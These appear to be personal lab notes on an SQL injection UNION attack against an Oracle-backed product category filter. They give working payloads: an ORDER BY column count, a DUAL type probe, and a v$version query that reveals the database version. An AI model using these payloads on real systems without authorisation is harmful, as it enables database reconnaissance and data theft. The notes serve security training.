Goal: Query the DB type and version using UNION attack 

Attack place: Product category filter

Step 1: Look for a field in the website that is vulnerable to SQL attach (eg: place a ' and look for 500 error)

Vulnerable: GET /filter?category=Gifts'+order+by+3 HTTP/2 (don't forget to URL incode it)

Analysis:
1) Number of Columns in the table
order by 3 - Internal server error - therefore only two column present

2) Determine the Datatype of the Columns
' UNION SELECT 'a', 'a' from DUAL-- => will throw a type mismatch error if this is not the correct type

3) Ouput the version and database of the Oracle DB:
(look at the cheatsheet for the SQL command)

' UNION SELECT banner, NULL FROM v$version--

(two columns because the number of columns has to be same in both the select statements in SQL)
